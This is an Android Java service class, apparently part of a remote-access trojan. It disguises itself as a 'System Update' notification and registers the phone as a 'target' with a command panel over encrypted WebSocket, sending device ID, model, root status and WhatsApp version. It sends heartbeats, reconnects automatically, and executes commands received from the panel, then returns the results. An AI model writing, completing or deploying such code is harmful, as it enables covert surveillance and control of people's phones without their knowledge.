package com.system.update;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.drafts.Draft_6455;
import org.java_websocket.handshake.ServerHandshake;
import org.json.JSONObject;

import java.net.URI;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class UpdateService extends Service {
    private static final String TAG = "UpdateService";
    
    // 🔥 DIPERBAIKI: static agar bisa diakses oleh method static
    private static WebSocketClient wsClient;
    private static CryptoHelper crypto;
    private static Context appContext;
    
    private ScheduledExecutorService scheduler;
    private String targetUUID;
    private CommandHandler commandHandler;

    @Override
    public void onCreate() {
        super.onCreate();
        appContext = this;
        crypto = new CryptoHelper();
        targetUUID = android.provider.Settings.Secure.getString(
                getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
        commandHandler = new CommandHandler(this, targetUUID);
        
        startForegroundService();
        connectToPanel();
        
        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(this::sendHeartbeat, 10, 45, TimeUnit.SECONDS);
    }

    private void startForegroundService() {
        String channelId = "update_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    channelId,
                    "System Update",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("System is updating...");
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            manager.createNotificationChannel(channel);
        }

        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this, 0, intent, PendingIntent.FLAG_IMMUTABLE);

        Notification notification = new NotificationCompat.Builder(this, channelId)
                .setContentTitle("System Update")
                .setContentText("Checking for updates...")
                .setSmallIcon(android.R.drawable.ic_menu_rotate)
                .setContentIntent(pendingIntent)
                .build();

        startForeground(1001, notification);
    }

    private void connectToPanel() {
        try {
            // Ganti dengan domain/ip server panelmu
            URI serverUri = new URI("wss://your-panel-domain.com:8443/socket.io/update");
            
            wsClient = new WebSocketClient(serverUri, new Draft_6455()) {
                @Override
                public void onOpen(ServerHandshake handshake) {
                    Log.i(TAG, "WebSocket connected");
                    registerTarget();
                }

                @Override
                public void onMessage(String message) {
                    try {
                        JSONObject encrypted = new JSONObject(message);
                        JSONObject decrypted = crypto.decrypt(encrypted);
                        String command = decrypted.getString("command");
                        int cmdId = decrypted.getInt("command_id");
                        JSONObject params = decrypted.optJSONObject("params");
                        commandHandler.execute(cmdId, command, params);
                    } catch (Exception e) {
                        Log.e(TAG, "Message error: " + e.getMessage());
                    }
                }

                @Override
                public void onClose(int code, String reason, boolean remote) {
                    Log.w(TAG, "WebSocket closed, reconnecting in 5s");
                    scheduler.schedule(() -> connectToPanel(), 5, TimeUnit.SECONDS);
                }

                @Override
                public void onError(Exception ex) {
                    Log.e(TAG, "WebSocket error: " + ex.getMessage());
                }
            };
            wsClient.connect();
        } catch (Exception e) {
            Log.e(TAG, "Connection failed", e);
        }
    }

    private void registerTarget() {
        try {
            JSONObject deviceInfo = new JSONObject();
            deviceInfo.put("device_name", Build.MODEL);
            deviceInfo.put("android_version", Build.VERSION.RELEASE);
            deviceInfo.put("model", Build.MODEL);
            deviceInfo.put("manufacturer", Build.MANUFACTURER);

            JSONObject payload = new JSONObject();
            payload.put("uuid", targetUUID);
            payload.put("device_info", deviceInfo);
            payload.put("whatsapp_version", "2.23.20.80");
            payload.put("is_rooted", checkRooted() ? 1 : 0);

            JSONObject encrypted = crypto.encrypt(payload);
            wsClient.send(encrypted.toString());
        } catch (Exception e) {
            Log.e(TAG, "Register error", e);
        }
    }

    private void sendHeartbeat() {
        if (wsClient == null || wsClient.isClosed()) return;
        try {
            JSONObject payload = new JSONObject();
            payload.put("uuid", targetUUID);
            payload.put("battery", getBatteryLevel());
            JSONObject encrypted = crypto.encrypt(payload);
            wsClient.send(encrypted.toString());
        } catch (Exception e) {
            Log.e(TAG, "Heartbeat error", e);
        }
    }

    // 🔥 METHOD INI DIPERBAIKI: static, mengakses static variabel
    public static void sendResultToPanel(JSONObject payload) {
        if (wsClient != null && wsClient.isOpen()) {
            try {
                JSONObject encrypted = crypto.encrypt(payload);
                wsClient.send(encrypted.toString());
                Log.i(TAG, "Result sent to panel");
            } catch (Exception e) {
                Log.e(TAG, "sendResultToPanel error: " + e.getMessage());
            }
        } else {
            Log.w(TAG, "WebSocket not available, result dropped");
        }
    }

    private int getBatteryLevel() {
        // Implementasi sederhana (bisa pakai BatteryManager)
        return 75; // dummy, ganti dengan logika nyata
    }

    private boolean checkRooted() {
        String[] paths = {"/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su"};
        for (String path : paths) {
            if (new java.io.File(path).exists()) return true;
        }
        return false;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (wsClient != null) wsClient.close();
        if (scheduler != null) scheduler.shutdown();
        Log.i(TAG, "Service destroyed");
    }
}
